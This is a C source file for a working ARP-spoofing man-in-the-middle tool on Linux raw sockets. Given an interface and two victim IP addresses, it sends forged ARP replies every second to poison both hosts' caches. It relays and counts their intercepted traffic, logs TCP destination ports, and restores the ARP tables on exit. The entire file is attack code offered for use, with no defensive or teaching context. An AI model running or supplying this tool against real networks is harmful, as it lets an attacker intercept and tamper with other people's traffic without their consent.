/*
 * MitM implementation
 *
 */
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <fcntl.h>
#include <time.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/ip.h>
#include <signal.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>

#include <netinet/tcp.h>

#define ARPHRD_ETHER 	1		/* Ethernet 10Mbps		*/
#define	ARPOP_REQUEST	1		/* ARP request			*/
#define	ARPOP_REPLY	2		/* ARP reply			*/
#define	ARPOP_RREQUEST	3		/* RARP request			*/
#define	ARPOP_RREPLY	4		/* RARP reply			*/
#define	ARPOP_InREQUEST	8		/* InARP request		*/
#define	ARPOP_InREPLY	9		/* InARP reply			*/
#define	ARPOP_NAK	10		/* (ATM)ARP NAK			*/

struct sock_filter {	/* Filter block */
	__u16	code;   /* Actual filter code */
	__u8	jt;	/* Jump true */
	__u8	jf;	/* Jump false */
	__u32	k;      /* Generic multiuse field */
};

struct sock_fprog {			/* Required for SO_ATTACH_FILTER. */
	unsigned short		   len;	/* Number of filter blocks */
	struct sock_filter *filter;
};

struct eth_header {
    unsigned char		target[ETH_ALEN];
    unsigned char		source[ETH_ALEN];
    unsigned short		proto;
};

struct arp_packet
{
    struct eth_header eth;	

    unsigned short          ar_hrd;         /* format of hardware address   */
    unsigned short         	ar_pro;         /* format of protocol address   */
    unsigned char   	ar_hln;         /* length of hardware address   */
    unsigned char   	ar_pln;         /* length of protocol address   */
    unsigned short          ar_op;          /* ARP opcode (command)         */

    unsigned char           ar_sha[ETH_ALEN];       /* sender hardware address      */
    unsigned char           ar_sip[4];              /* sender IP address            */
    unsigned char           ar_tha[ETH_ALEN];       /* target hardware address      */
    unsigned char           ar_tip[4];              /* target IP address            */
};

struct macip {
    unsigned char mac[6];
    unsigned char ip[4];
};

unsigned char mitm_IPbuf[0xFF];
unsigned char mitm_MACbuf[0xFF];
char*mitm_printMAC(unsigned char*);
char*mitm_printIP(unsigned char*);

void mitm_usage();
void mitm_run();
void mitm_end();
void mitm_thread_end(int s);
void *mitm_ARP_spoofer(void*);
void mitm_ARP_cleanup();
void *mitm_sniffer(void*);
void *mitm_printstats(void*);
int mitm_is_victim(unsigned char*);
int mitm_is_me(unsigned char*);

int arp_lookup(int,unsigned char*,unsigned char*,unsigned char*);


/* Interface used to do the mitm */
unsigned char *ifname;
struct ifreq ifr;

/* Socket raw and its address */
int sock;
struct sockaddr_ll addr;
struct sockaddr_ll addr_replay;

/* The MAC & IP of the attacking */
unsigned char my_mac[6];
unsigned char my_ip[4];

/* The MAC & IP  adresses of the */
struct macip victimA;
struct macip victimB;

/* Threads */
int mitm_running;
pthread_t sniffer;
pthread_t spooferA;
pthread_t spooferB;
pthread_t statser;

/* Stats */
int mitm_packets;
int mitm_packets_replayed;

int main(int argc, char *argv[]) {
    int c;
    
    if (argc != 4){
        mitm_usage();
        return EXIT_FAILURE;
    }

    ifname = (unsigned char*)malloc(20);
    strcpy((char*)ifname,argv[1]);

    unsigned int tmpIP[4];
    c=sscanf(argv[2],"%d.%d.%d.%d", &tmpIP[0], &tmpIP[1], &tmpIP[2], &tmpIP[3]);
    for (int i=0; i<4; i++) {
        victimA.ip[i] = (char)tmpIP[i];
    }
    c=sscanf(argv[3],"%d.%d.%d.%d", &tmpIP[0], &tmpIP[1], &tmpIP[2], &tmpIP[3]);
    for (int i=0; i<4; i++) {
        victimB.ip[i] = (char)tmpIP[i];
    }

    sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    /* From the example above: tcpdump -i em1 port 80 -dd */
	struct sock_filter code[] = {
	{ 0x28, 0, 0, 0x0000000c },
	{ 0x15, 0, 8, 0x000086dd },
	{ 0x30, 0, 0, 0x00000014 },
	{ 0x15, 2, 0, 0x00000084 },
	{ 0x15, 1, 0, 0x00000006 },
	{ 0x15, 0, 17, 0x00000011 },
	{ 0x28, 0, 0, 0x00000036 },
	{ 0x15, 14, 0, 0x00000050 },
	{ 0x28, 0, 0, 0x00000038 },
	{ 0x15, 12, 13, 0x00000050 },
	{ 0x15, 0, 12, 0x00000800 },
	{ 0x30, 0, 0, 0x00000017 },
	{ 0x15, 2, 0, 0x00000084 },
	{ 0x15, 1, 0, 0x00000006 },
	{ 0x15, 0, 8, 0x00000011 },
	{ 0x28, 0, 0, 0x00000014 },
	{ 0x45, 6, 0, 0x00001fff },
	{ 0xb1, 0, 0, 0x0000000e },
	{ 0x48, 0, 0, 0x0000000e },
	{ 0x15, 2, 0, 0x00000050 },
	{ 0x48, 0, 0, 0x00000010 },
	{ 0x15, 0, 1, 0x00000050 },
	{ 0x6, 0, 0, 0x00040000 },
	{ 0x6, 0, 0, 0x00000000 },

	};


	struct sock_fprog bpf = {
	.len = sizeof(code)/sizeof(struct sock_filter),
	.filter = code,
	};

	int ret = setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf));
	if (ret < 0)
	perror("Filter issue:");

    if (sock < 0) {
        fprintf(stderr, "Error while opening raw socket (are you root?)\n");
        return EXIT_FAILURE;
    }

    snprintf(ifr.ifr_name, 16, "%s", ifname);
    
   int sock1 = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (ioctl(sock1, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "Error: %s no such device\n", ifr.ifr_name);
        return EXIT_FAILURE;
    }

    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_pkttype = PACKET_HOST;
    addr.sll_halen = 0;

    if (ioctl(sock1, SIOCGIFHWADDR, &ifr)<0) {
        fprintf(stderr, "Error: unable to retrieve MAC Adress of %s\n", ifr.ifr_name);
        return 0x1;
    }

    for (int i=0; i<sizeof(my_mac); i++) {
        my_mac[i] = ifr.ifr_hwaddr.sa_data[i];	
    }

    if (ioctl(sock1, SIOCGIFADDR, &ifr)<0) {
        fprintf(stderr, "Error: unable to retrieve IP Adress of %s\n", ifr.ifr_name);
        return 0x1;
    }

    for (int i=0; i<sizeof(my_ip); i++) {
        my_ip[i] = ((unsigned char*)&((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr)[i];
    }

    if (!arp_lookup(sock1, ifname, victimA.ip, victimA.mac)) {
        fprintf(stderr, "Unable to get hardware address of %d.%d.%d.%d\n",
                victimA.ip[0]&0xFF, victimA.ip[1]&0xFF, victimA.ip[2]&0xFF, victimA.ip[3]&0xFF);
        return EXIT_FAILURE;
    }

    if (!arp_lookup(sock1, ifname, victimB.ip, victimB.mac)) {
        fprintf(stderr, "Unable to get hardware address of %d.%d.%d.%d\n",
                victimB.ip[0]&0xFF, victimB.ip[1]&0xFF, victimB.ip[2]&0xFF, victimB.ip[3]&0xFF);
        return EXIT_FAILURE;
    }

    printf("Attacker is at %s\n", mitm_printMAC(my_mac));
    printf("%s is at %s\n", mitm_printIP(victimA.ip), mitm_printMAC(victimA.mac));
    printf("%s is at %s\n", mitm_printIP(victimB.ip), mitm_printMAC(victimB.mac));


    mitm_run();

    return EXIT_SUCCESS;
}

void mitm_usage() {
    fprintf(stderr,
            "Usage: mitm interface ip1 ip2\n"
            "	interface: 	specify network interface to use\n"
            "	ip1:		The IP adress of the first victim\n"
            "	ip2:		The IP adress of the second victim\n"
           );
}

char* mitm_printMAC(unsigned char *mac) {
    sprintf((char*)mitm_MACbuf, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac[0]&0xFF, mac[1]&0xFF, mac[2]&0xFF, mac[3]&0xFF, mac[4]&0xFF, mac[5]&0xFF);
    return (char*)mitm_MACbuf;
}

char* mitm_printIP(unsigned char *ip) {
    sprintf((char*)mitm_IPbuf,"%d.%d.%d.%d", ip[0]&0xFF, ip[1]&0xFF, ip[2]&0xFF, ip[3]&0xFF);
    return (char*)mitm_IPbuf;
}


int arp_lookup(int s, unsigned char *ifn, unsigned char* ip, unsigned char* mac) {
    struct arpreq ar;
    sprintf(ar.arp_dev,"%s",ifn);
    ((struct sockaddr_in*)&ar.arp_pa)->sin_family=AF_INET;

    for (int i=0; i<4; i++) {
        ((unsigned char*)&(((struct sockaddr_in*)&ar.arp_pa)->sin_addr.s_addr))[i]=ip[i];
    }

    if (ioctl(s, SIOCGARP, &ar)==0) {
        for (int i=0; i<6; i++)	
            mac[i] = ar.arp_ha.sa_data[i];
        return 1;
    } else {
        struct arp_packet pckt;
        int started;

        pckt.eth.proto= htons(ETH_P_ARP);
        pckt.ar_hrd     = htons(ARPHRD_ETHER);  /* ARP Packet for Ethernet support */
        pckt.ar_pro     = htons(ETH_P_IP);      /* ARP Packet for IP Protocol */
        pckt.ar_hln     = 0x6;                  /* Ethernet adresses on 6 bytes */
        pckt.ar_pln     = 0x4;                  /* IP adresses on 4 bytes */
        pckt.ar_op      = htons(ARPOP_REQUEST);   /* ARP Op is a Reply */

        for (int i=0; i<4; i++) {
            pckt.ar_sip[i] = my_ip[i];
            pckt.ar_tip[i] = ip[i];
        }	

        for (int i=0; i<6; i++) {
            pckt.ar_sha[i] = my_mac[i];
            pckt.ar_tha[i] = 0x00;
            pckt.eth.source[i] = my_mac[i];
            pckt.eth.target[i] = 0xff;
        }

        sendto(s,(unsigned char*)&pckt,sizeof(struct arp_packet),0,(struct sockaddr*)&addr,sizeof(struct sockaddr_ll));
        started=time(NULL);

        int n;
        char buffer[0xffff];
        socklen_t sl=sizeof(struct sockaddr_ll);
        struct sockaddr_ll laddr;
        struct arp_packet *ptr;
        fcntl(sock, F_SETFL, O_NONBLOCK);

        while ((time(NULL)-started) < 2) {
            n=recvfrom(sock,buffer, 0xffff, 0, (struct sockaddr*)&laddr,&sl);
            if (n>0 && n>=sizeof(struct arp_packet)) {
                ptr=(struct arp_packet*)buffer;
                if (ptr->eth.proto == htons(ETH_P_ARP)) {
                    if (ptr->ar_op == htons(ARPOP_REPLY)) {
                        if (*((int*)ptr->ar_sip) == *((int*)ip)) {
                            for (int i=0; i<6; i++)
                                mac[i] = ptr->ar_sha[i];
                            return 1;
                        }
                    }
                }
            }
        }

        return 0;
    }
}

void mitm_end(int s) {
    printf("\nShutdowning, please wait\n");
    mitm_running = 0x0;
}


void mitm_run() {
    int AB = 0;
    int BA = 1;
    unsigned char c;
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 100*1000000;
    mitm_packets = 0;
    mitm_packets_replayed = 0;
    mitm_running = 1;
    signal(SIGINT, mitm_end);
    pthread_create(&sniffer, NULL, mitm_sniffer, NULL);
    pthread_create(&spooferA, NULL, mitm_ARP_spoofer, (void*)&AB);
    pthread_create(&spooferB, NULL, mitm_ARP_spoofer, (void*)&BA);

    printf("Monkey is in the middle (Press escape to exit)\n");
    pthread_create(&statser, NULL, mitm_printstats, NULL);
    fcntl(0, F_SETFL, O_NONBLOCK);

    while (mitm_running) {
        c = fgetc(stdin);
        if (c == 27) {
            mitm_end(SIGINT);
            break;
        }
        nanosleep(&ts, NULL);
    }
    pthread_join(spooferA,NULL);
    pthread_join(spooferB,NULL);
    pthread_join(sniffer,NULL);
    printf("Cleaning up ARP tables\n");
    mitm_ARP_cleanup();
}

void *mitm_printstats(void*d) {
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 100*1000000;
    while (mitm_running) {
        printf("\rRead %d packets, %d packets replayed",mitm_packets,mitm_packets_replayed);
        nanosleep(&ts, NULL);
    }
    return NULL;
}

void *mitm_ARP_spoofer(void *d) {
    struct arp_packet pckt;
    int mode = *((int*)d);

    pckt.eth.proto= htons(ETH_P_ARP);
    pckt.ar_hrd = htons(ARPHRD_ETHER);	/* ARP Packet for Ethernet support */
    pckt.ar_pro = htons(ETH_P_IP);	/* ARP Packet for IP Protocol */
    pckt.ar_hln = 6;			/* Ethernet adresses on 6 bytes */
    pckt.ar_pln	= 4;			/* IP adresses on 4 bytes */
    pckt.ar_op	= htons(ARPOP_REPLY);	/* ARP Op is a Reply */

    for (int i=0; i<6; i++) {
        pckt.ar_sha[i] = my_mac[i];
        pckt.eth.source[i] = my_mac[i];
    }
    for (int i=0; i<4; i++)
        if (mode == 0) {
            pckt.ar_sip[i] = victimA.ip[i];
            pckt.ar_tip[i] = victimB.ip[i];
        } else {
            pckt.ar_sip[i] = victimB.ip[i];
            pckt.ar_tip[i] = victimA.ip[i];
        }

    for (int i=0; i<6; i++) {
        if (mode == 0) {
            pckt.ar_tha[i] = victimB.mac[i];
            pckt.eth.target[i] = victimB.mac[i];
        } else {
            pckt.ar_tha[i] = victimA.mac[i];
            pckt.eth.target[i] = victimA.mac[i];
        }
    }

    while (mitm_running) {
        sendto(sock,(unsigned char*)&pckt,sizeof(struct arp_packet),
                0, (struct sockaddr*)&addr,sizeof(struct sockaddr_ll));
        sleep(1);
    }

    return NULL;
}

void mitm_ARP_cleanup() {
    struct arp_packet pckt;
    int mode;

    pckt.eth.proto= htons(ETH_P_ARP);
    pckt.ar_hrd = htons(ARPHRD_ETHER);  /* ARP Packet for Ethernet support */
    pckt.ar_pro = htons(ETH_P_IP);      /* ARP Packet for IP Protocol */
    pckt.ar_hln = 6;                    /* Ethernet adresses on 6 bytes */
    pckt.ar_pln = 4;                    /* IP adresses on 4 bytes */
    pckt.ar_op = htons(ARPOP_REPLY);    /* ARP Op is a Reply */

    for (mode=0; mode<=1; mode++) {
        for (int i=0; i<6; i++) {
            if (mode == 0) {
                pckt.ar_sha[i] = victimA.mac[i];
                pckt.ar_tha[i] = victimB.mac[i];
                pckt.eth.target[i] = victimB.mac[i];
            } else {
                pckt.ar_sha[i] = victimB.mac[i];
                pckt.ar_tha[i] = victimA.mac[i];
                pckt.eth.target[i] = victimA.mac[i];
            }
            pckt.eth.source[i] = my_mac[i];
        }
        for (int i=0; i<4; i++) {
            if (mode == 0) {
                pckt.ar_sip[i] = victimA.ip[i];
                pckt.ar_tip[i] = victimB.ip[i];
            } else {
                pckt.ar_sip[i] = victimB.ip[i];
                pckt.ar_tip[i] = victimA.ip[i];
            }
        }

        sendto(sock,(unsigned char*)&pckt,sizeof(struct arp_packet),
                0, (struct sockaddr*)&addr,sizeof(struct sockaddr_ll));
    }
}


int mitm_is_victim(unsigned char*m) {
    int ok = 1;

    for (int i=0; i<6; i++) {
        if (m[i] != victimA.mac[i]) {
            ok = 0;
        }
    }	
    if (ok) { 
        return 1;
    }

    ok = 2;
    for (int i=0; i<6; i++) {
        if (m[i] != victimB.mac[i]) {
            ok = 0;
        }
    }	
    return ok;
}

int mitm_is_me(unsigned char*m) {
    for (int i=0; i<6; i++) {
        if (my_mac[i] != m[i]) {
            return 0;
        }
    }
    return 1;
}

void *mitm_sniffer(void*d) {
    int n, replay;
    socklen_t sl=sizeof(struct sockaddr_ll);
    struct sockaddr_ll laddr;
    struct eth_header *eth;
    unsigned char buffer[0xffff];
    struct iphdr *iph;
    int vid;
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 1000000;

    fcntl(sock, F_SETFL, O_NONBLOCK);

    while (mitm_running) {	
        int q = 0;
        n=recvfrom(sock,buffer,0xFFFF,0,(struct sockaddr*)&laddr,&sl);
        replay=0;
        if (n>0) {
            if (n>sizeof(struct eth_header) && laddr.sll_ifindex==addr.sll_ifindex) {
                mitm_packets++;
                eth = (struct eth_header*)buffer;
                if (eth->proto == htons(ETH_P_IP)) {
                    vid=mitm_is_victim(eth->source);
                    if (vid && mitm_is_me(eth->target)) {
                        iph=(struct iphdr *)(buffer+sizeof(struct eth_header));
                        if (iph->daddr != *((int*)my_ip) && vid!=0) {
                            for (int i=0; i<6; i++) {
                                eth->source[i]=my_mac[i];
                            }
                            replay = 1;
                            if (vid == 1) {
                                for (int i=0; i<6; i++) {
                                    eth->target[i] = victimB.mac[i];
                                    q = 1;
                                }
                            } else {
                                for (int i=0; i<6; i++) {
                                    eth->target[i] = victimA.mac[i];
                                    q = 2;
                                }
                            }
                        }
                    }
                }
            }
        }

        if(replay) {
            mitm_packets_replayed++;
            
	   	if(q==1)
		{
			struct iphdr * iph=(struct iphdr *)(buffer+sizeof(struct eth_header));
			if(iph->protocol==6)
			{
				struct tcphdr *tcp=(struct tcphdr*)(buffer+sizeof(struct eth_header)+sizeof(struct iphdr));

				printf("TCP dest port %d\n", tcp->dest);
			}
		}

		sendto(sock,buffer, n, 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_ll));
        }
        if (n <= 0) {
            nanosleep(&ts, NULL);
        }
    }

    return NULL;
}

